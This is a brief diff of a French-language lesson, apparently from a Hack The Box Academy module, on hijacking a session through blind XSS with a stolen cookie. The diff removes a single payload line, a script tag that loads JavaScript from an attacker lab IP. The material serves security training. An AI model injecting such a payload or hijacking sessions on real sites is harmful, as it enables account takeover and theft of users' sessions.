@@ -177,5 +177,3 @@ Enfin, nous pouvons utiliser ce cookie sur la page «Login.php» pour accéder a
 Une fois que nous aurons réglé notre cookie, nous pouvons actualiser la page et nous aurons accès comme victime:
 
 ![](https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg)
-
-<script src=http://10.10.14.160:8080/script.js></script>
